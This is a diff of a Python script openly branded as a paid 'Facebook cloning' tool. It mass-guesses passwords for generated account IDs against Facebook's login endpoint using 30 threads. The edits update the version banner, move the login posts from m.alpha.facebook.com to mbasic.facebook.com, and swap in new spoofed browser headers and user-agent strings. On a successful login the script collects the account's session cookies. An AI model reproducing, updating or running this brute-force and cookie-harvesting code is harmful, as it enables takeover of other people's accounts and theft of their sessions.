@@ -117,8 +117,8 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m5.0\033[1;32m
-{+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 6.0\033[1;32m
+{+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
 --------------------------------------------------""")
@@ -580,9 +580,9 @@ def pak():
 		with tred(max_workers=30) as AXI:	
 			clear()
 			tl = str(len(user))
-			print(' Total idz : \033[1;32m'+tl+f' ')
-			print(f'\033[1;32m Your selected code ..:\033[1;32m '+code)
-			print(f'\033[1;32m \x1b[38;5;208mif you Show no result use flight mode\033[1;97m')
+			print('Total idz : \033[1;32m'+tl+f' ')
+			print(f'\033[1;32mYour selected code ..:\033[1;32m '+code)
+			print(f'\033[1;32m\x1b[38;5;208mif you Show no result use flight mode\033[1;33m')
 			linex()
 			for psx in user:
 				ids = code+psx
@@ -844,13 +844,13 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.alpha.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 		    'method': 'GET',
 	        'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
@@ -858,8 +858,8 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',}
-			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -912,8 +912,8 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m5.0\033[1;32m
-{+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 6.0\033[1;32m
+{+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
 \033[1;37m[+]Status : PAID
